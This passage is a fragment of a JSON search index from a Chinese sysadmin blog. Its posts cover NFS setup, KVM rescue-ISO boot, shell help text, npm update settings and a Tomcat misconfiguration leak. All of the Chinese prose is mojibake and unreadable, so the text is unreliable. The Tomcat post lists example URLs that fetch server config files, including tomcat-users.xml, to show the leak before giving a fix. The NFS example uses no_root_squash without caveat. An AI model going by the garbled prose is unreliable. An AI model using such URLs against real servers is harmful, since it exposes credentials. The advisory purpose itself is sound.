class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸»è¦å°±æ˜¯è¦é…ç½®ä»£ç†ï¼Œä»£ç†åˆ°minioçš„9000ç«¯å£\u003c/p\u003e","title":"é…ç½®Minio+nginxçš„ä»£ç†æ¥å¼€æ”¾æ¡¶å†…å†…å®¹"},{"content":"NFSçš„SERVERåˆ†ä¸¤éƒ¨åˆ†ï¼š 1ã€RPC ä¸»ç¨‹åºï¼šrpcbind NFS æœ¬è´¨æ˜¯ä¸€ä¸ª RPC æœåŠ¡ï¼Œè€Œè¦å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œéƒ½éœ€è¦åšå¥½ port çš„å¯¹åº” (mapping) çš„å·¥ä½œæ‰è¡Œï¼Œè¿™ä¸ªå·¥ä½œå…¶å®å°±æ˜¯ã€ rpcbind ã€è¿™ä¸ªæœåŠ¡æ‰€è´Ÿè´£çš„ï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œ åœ¨å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½éœ€è¦å¯åŠ¨ rpcbind æ‰è¡Œï¼ (åœ¨ CentOS 5.x ä»¥å‰è¿™ä¸ªè½¯ä»¶ç§°ä¸º portmapï¼Œåœ¨ CentOS 6.x ä¹‹åæ‰ç§°ä¸º rpcbind çš„ï¼)\n2ã€NFS ä¸»ç¨‹åºï¼šnfs-utils å°±æ˜¯æä¾› rpc.nfsd åŠ rpc.mountd è¿™ä¸¤ä¸ª NFS daemons ä¸å…¶ä»–ç›¸å…³ documents ä¸è¯´æ˜æ–‡ä»¶ã€æ‰§è¡Œæ–‡ä»¶ç­‰çš„è½¯ä»¶ï¼è¿™ä¸ªå°±æ˜¯ NFS æœåŠ¡æ‰€éœ€è¦çš„ä¸»è¦è½¯ä»¶ï¼\nå®‰è£…æœåŠ¡ç«¯NFS Server yum install nfs-utils rpcbind -y sudo apt install nfs-kernel-server å®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡ï¼Œæ‰€ä»¥ä¸ç”¨è£…rpcbind yum install nfs-utils sudo apt install nfs-common å°†NFSå’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨ systemctl enable --now rpcbind systemctl enable --now nfs å®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡ æœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfsï¼š rpm -qa | grep nfsä¸ rpm -qa | grep rpcbindå³å¯ åœæ­¢æœåŠ¡ç«¯çš„nfs serverçš„æ–¹æ³•ï¼š systemctl stop nfs systemctl stop rpcbind é…ç½®å…±äº«ç›®å½• åœ¨æœåŠ¡ç«¯é…ç½®ä¸€ä¸ªå…±äº«ç›®å½•\n$ mkdir /data $ chmod 755 /data æ ¹æ®è¿™ä¸ªç›®å½•ï¼Œç›¸åº”é…ç½®å¯¼å‡ºç›®å½•\n$ vi /etc/exports æ·»åŠ å¦‚ä¸‹é…ç½® /data/ 192.168.0.0/24(rw,sync,no_root_squash,no_all_squash)\n/data: å…±äº«ç›®å½•ä½ç½®ã€‚ 192.168.0.0/24: å®¢æˆ·ç«¯ IP èŒƒå›´ï¼Œ* ä»£è¡¨æ‰€æœ‰ï¼Œå³æ²¡æœ‰é™åˆ¶ã€‚ rw: æƒé™è®¾ç½®ï¼Œå¯è¯»å¯å†™ã€‚ sync: åŒæ­¥å…±äº«ç›®å½•ã€‚ no_root_squash: å¯ä»¥ä½¿ç”¨ root æˆæƒã€‚ no_all_squash: å¯ä»¥ä½¿ç”¨æ™®é€šç”¨æˆ·æˆæƒã€‚ åœ¨å®¢æˆ·ç«¯ä¸ŠæŸ¥è¯¢serverï¼š showmount -e 10.0.6.10 mount -t nfs 192.168.0.1:/data /mnt/nfs å–æ¶ˆæŒ‚è½½ umount /app/file fuser /app/file umount -d -l /app/file fuser -m -v -i -k /app/file ","permalink":"https://rendoumi.com/posts/20231228-nfs_detail/","summary":"\u003ch2 id=\"nfsçš„serveråˆ†ä¸¤éƒ¨åˆ†\"\u003eNFSçš„SERVERåˆ†ä¸¤éƒ¨åˆ†ï¼š\u003c/h2\u003e\n\u003ch3 id=\"1rpc-ä¸»ç¨‹åºrpcbind\"\u003e1ã€RPC ä¸»ç¨‹åºï¼šrpcbind\u003c/h3\u003e\n\u003cp\u003eNFS æœ¬è´¨æ˜¯ä¸€ä¸ª RPC æœåŠ¡ï¼Œè€Œè¦å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œéƒ½éœ€è¦åšå¥½ port çš„å¯¹åº” (mapping) çš„å·¥ä½œæ‰è¡Œï¼Œè¿™ä¸ªå·¥ä½œå…¶å®å°±æ˜¯ã€ rpcbind ã€è¿™ä¸ªæœåŠ¡æ‰€è´Ÿè´£çš„ï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œ åœ¨å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½éœ€è¦å¯åŠ¨ rpcbind æ‰è¡Œï¼ (åœ¨ CentOS 5.x ä»¥å‰è¿™ä¸ªè½¯ä»¶ç§°ä¸º portmapï¼Œåœ¨ CentOS 6.x ä¹‹åæ‰ç§°ä¸º rpcbind çš„ï¼)\u003c/p\u003e\n\u003ch3 id=\"2nfs-ä¸»ç¨‹åºnfs-utils\"\u003e2ã€NFS ä¸»ç¨‹åºï¼šnfs-utils\u003c/h3\u003e\n\u003cp\u003eå°±æ˜¯æä¾› rpc.nfsd åŠ rpc.mountd è¿™ä¸¤ä¸ª NFS daemons ä¸å…¶ä»–ç›¸å…³ documents ä¸è¯´æ˜æ–‡ä»¶ã€æ‰§è¡Œæ–‡ä»¶ç­‰çš„è½¯ä»¶ï¼è¿™ä¸ªå°±æ˜¯ NFS æœåŠ¡æ‰€éœ€è¦çš„ä¸»è¦è½¯ä»¶ï¼\u003c/p\u003e\n\u003ch2 id=\"å®‰è£…æœåŠ¡ç«¯nfs-server\"\u003eå®‰è£…æœåŠ¡ç«¯NFS Server\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils rpcbind  -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install nfs-kernel-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡æ‰€ä»¥ä¸ç”¨è£…rpcbind\"\u003eå®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡ï¼Œæ‰€ä»¥ä¸ç”¨è£…rpcbind\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install nfs-common\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å°†nfså’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨\"\u003eå°†NFSå’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now nfs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡\"\u003eå®¢æˆ·ç«¯ä¸ç”¨å¯ç”¨ä»»ä½•æœåŠ¡\u003c/h2\u003e\n\u003ch2 id=\"æœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfs\"\u003eæœåŠ¡ç«¯æ£€æŸ¥æ˜¯å¦å®‰è£…nfsï¼š\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -qa \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nfsä¸ rpm -qa \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep rpcbindå³å¯\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"åœæ­¢æœåŠ¡ç«¯çš„nfs-serverçš„æ–¹æ³•\"\u003eåœæ­¢æœåŠ¡ç«¯çš„nfs serverçš„æ–¹æ³•ï¼š\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl stop nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl stop rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"é…ç½®å…±äº«ç›®å½•\"\u003eé…ç½®å…±äº«ç›®å½•\u003c/h2\u003e\n\u003cp\u003eåœ¨æœåŠ¡ç«¯é…ç½®ä¸€ä¸ªå…±äº«ç›®å½•\u003c/p\u003e","title":"NFSçš„è¯¦ç»†è§£é‡Š"},{"content":"Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•ï¼š é¦–å…ˆå»åˆ°å®¿ä¸»æœº\nç¼–è¾‘è™šæœºæ–‡ä»¶virsh edit vis-18-32-6\n\u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; åœ¨targetä¸‹é¢å¢åŠ ä¸€è¡Œsourceï¼š\n\u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;source file=\u0026#34;/export/kvm/systemrescuecd-x86-5.2.2.iso\u0026#34;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; å†ä¿®æ”¹bootä¸ºcdromï¼Œæ”¹å›å»åˆ™æ˜¯hd\n\u0026lt;os\u0026gt; \u0026lt;type arch=\u0026#39;x86_64\u0026#39; machine=\u0026#39;pc-i440fx-rhel7.0.0\u0026#39;\u0026gt;hvm\u0026lt;/type\u0026gt; \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; \u0026lt;/os\u0026gt; ç„¶åå¯åŠ¨è™šæœºå°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231228-kvm_isoboot/","summary":"\u003ch4 id=\"kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•\"\u003eKvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•ï¼š\u003c/h4\u003e\n\u003cp\u003eé¦–å…ˆå»åˆ°å®¿ä¸»æœº\u003c/p\u003e\n\u003cp\u003eç¼–è¾‘è™šæœºæ–‡ä»¶virsh edit vis-18-32-6\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hda\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨targetä¸‹é¢å¢åŠ ä¸€è¡Œsourceï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hda\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t  \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/kvm/systemrescuecd-x86-5.2.2.iso\u0026#34;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†ä¿®æ”¹bootä¸ºcdromï¼Œæ”¹å›å»åˆ™æ˜¯hd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;os\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;\u003cspan class=\"nb\"\u003etype\u003c/span\u003e \u003cspan class=\"nv\"\u003earch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;x86_64\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003emachine\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pc-i440fx-rhel7.0.0\u0026#39;\u003c/span\u003e\u0026gt;hvm\u0026lt;/type\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;/os\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå¯åŠ¨è™šæœºå°±å¯ä»¥äº†ã€‚\u003c/p\u003e","title":"Kvmè™šæ‹ŸæœºæŒ‚è½½ä¸´æ—¶æ€¥æ•‘isoå¯åŠ¨çš„æ–¹æ³•"},{"content":"Shellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­ ä¸€ä¸ªå¥½çš„è„šæœ¬ï¼Œå¿…é¡»æœ‰å¥½çš„å¸®åŠ©ä¿¡æ¯\nç»™ä¸€ä¸ªæ¯”è¾ƒç®€æ´çš„ä¾‹å­\n#!/bin/bash\r###\r### my-script â€” does one thing well\r###\r### Usage:\r### my-script \u0026lt;input\u0026gt; \u0026lt;output\u0026gt;\r###\r### Options:\r### \u0026lt;input\u0026gt; Input file to read.\r### \u0026lt;output\u0026gt; Output file to write. Use '-' for stdout.\r### -h Show this message.\rhelp() {\rawk -F'### ' '/^###/ { print $2 }' \u0026quot;$0\u0026quot;\r}\rif [[ $# == 0 ]] || [[ \u0026quot;$1\u0026quot; == \u0026quot;-h\u0026quot; ]]; then\rhelp\rexit 1\rfi\recho Hello World\rä»¥å‰ä¸‘é™‹çš„ç”¨æ³•çœŸæ˜¯æ²¡æ³•çœ‹ï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20231228-shell_prompt/","summary":"\u003ch4 id=\"shellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­\"\u003eShellè„šæœ¬å¥½çš„å¸®åŠ©ä¿¡æ¯çš„ä¾‹å­\u003c/h4\u003e\n\u003cp\u003eä¸€ä¸ªå¥½çš„è„šæœ¬ï¼Œå¿…é¡»æœ‰å¥½çš„å¸®åŠ©ä¿¡æ¯\u003c/p\u003e\n\u003cp\u003eç»™ä¸€ä¸ªæ¯”è¾ƒç®€æ´çš„ä¾‹å­\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#!/bin/bash\r\n###\r\n### my-script â€” does one thing well\r\n###\r\n### Usage:\r\n###   my-script \u0026lt;input\u0026gt; \u0026lt;output\u0026gt;\r\n###\r\n### Options:\r\n###   \u0026lt;input\u0026gt;   Input file to read.\r\n###   \u0026lt;output\u0026gt;  Output file to write. Use '-' for stdout.\r\n###   -h        Show this message.\r\n\r\nhelp() {\r\n    awk -F'### ' '/^###/ { print $2 }' \u0026quot;$0\u0026quot;\r\n}\r\n\r\nif [[ $# == 0 ]] || [[ \u0026quot;$1\u0026quot; == \u0026quot;-h\u0026quot; ]]; then\r\n    help\r\n    exit 1\r\nfi\r\n\r\necho Hello World\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä»¥å‰ä¸‘é™‹çš„ç”¨æ³•çœŸæ˜¯æ²¡æ³•çœ‹ï¼ï¼ï¼\u003c/p\u003e","title":"shellè„šæœ¬çš„ä¸€ä¸ªå¥½çš„å¸®åŠ©ä¿¡æ¯"},{"content":"Nodejsç¦æ­¢åå°å·å·å‡çº§ å»åˆ°172.18.31.2ä¸Šï¼Œä¼šçœ‹åˆ°å¾ˆå¤šnodeè¿›ç¨‹\næœ‰ç—…å™»ï¼Œç³»ç»Ÿéƒ½æ²¡æœ‰è¿è¡Œnodeç¨‹åºã€‚å”¯ä¸€çš„ç¨‹åºæ˜¯nci-ansible-ui-quick-setupï¼Œåœ¨/export/serverä¸‹ï¼Œè¿˜æ²¡æœ‰è¿è¡Œï¼Œå‡çº§ä¸ªèŒ„å­å™»ã€‚\nå…¨æ€æ‰ï¼Œç„¶åå…¨å±€ç¦æ­¢å‡çº§å³å¯\nnpm config set update-notifier false --global ç¬¬ä¸€æ¬¡è¿è¡Œä¼šæœ‰ä¸ªæç¤ºï¼Œå†è¿è¡Œå°±æ²¡æœ‰äº†ã€‚ ","permalink":"https://rendoumi.com/posts/20231228-nodejs_noupgrade/","summary":"\u003ch4 id=\"nodejsç¦æ­¢åå°å·å·å‡çº§\"\u003eNodejsç¦æ­¢åå°å·å·å‡çº§\u003c/h4\u003e\n\u003cp\u003eå»åˆ°172.18.31.2ä¸Šï¼Œä¼šçœ‹åˆ°å¾ˆå¤šnodeè¿›ç¨‹\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231228-nodejs_noupgrade/2021-05-02_225810.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ‰ç—…å™»ï¼Œç³»ç»Ÿéƒ½æ²¡æœ‰è¿è¡Œnodeç¨‹åºã€‚å”¯ä¸€çš„ç¨‹åºæ˜¯nci-ansible-ui-quick-setupï¼Œåœ¨/export/serverä¸‹ï¼Œè¿˜æ²¡æœ‰è¿è¡Œï¼Œå‡çº§ä¸ªèŒ„å­å™»ã€‚\u003c/p\u003e\n\u003cp\u003eå…¨æ€æ‰ï¼Œç„¶åå…¨å±€ç¦æ­¢å‡çº§å³å¯\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enpm config set update-notifier false --global\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç¬¬ä¸€æ¬¡è¿è¡Œä¼šæœ‰ä¸ªæç¤ºï¼Œå†è¿è¡Œå°±æ²¡æœ‰äº†ã€‚\n\u003cimg loading=\"lazy\" src=\"/posts/20231228-nodejs_noupgrade/2021-05-02_230050.png\"\u003e\u003c/p\u003e","title":"Nodejsç¦æ­¢åå°å·å·å‡çº§"},{"content":"Tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ² è¯´æ˜ï¼šTomcatç”±äºé…ç½®ä¸å½“ä¼šå¯¼è‡´tomcat/conf log webapps work temp bin libç­‰ä¿¡æ¯æš´éœ²åœ¨æ¸¸è§ˆå™¨ä¸­ ä¾‹å¦‚ï¼š\nhttp://192.168.89.38:8080/conf/catalina.policy http://192.168.89.38:8080/conf/catalina.properties http://192.168.89.38:8080/conf/context.xml http://192.168.89.38:8080/conf/logging.properties http://192.168.89.38:8080/conf/server.xml http://192.168.89.38:8080/conf/tomcat-users.xml http://192.168.89.38:8080/conf/web.xml ä¿®å¤æ–¹æ³•ï¼š\nå°† /export/servers/tomcat ä¸‹çš„ server.xml \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;\u0026#34; æ”¹æˆ \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; appBaseåƒä¸‡ä¸èƒ½ä¸ºç©º ä¿®æ”¹å®Œåé‡å¯ç”Ÿæ•ˆ\n","permalink":"https://rendoumi.com/posts/20231228-tomcat_config/","summary":"\u003ch4 id=\"tomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²\"\u003eTomcaté…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶æ³„éœ²\u003c/h4\u003e\n\u003cp\u003eè¯´æ˜ï¼šTomcatç”±äºé…ç½®ä¸å½“ä¼šå¯¼è‡´tomcat/conf log webapps work temp bin libç­‰ä¿¡æ¯æš´éœ²åœ¨æ¸¸è§ˆå™¨ä¸­\nä¾‹å¦‚ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan 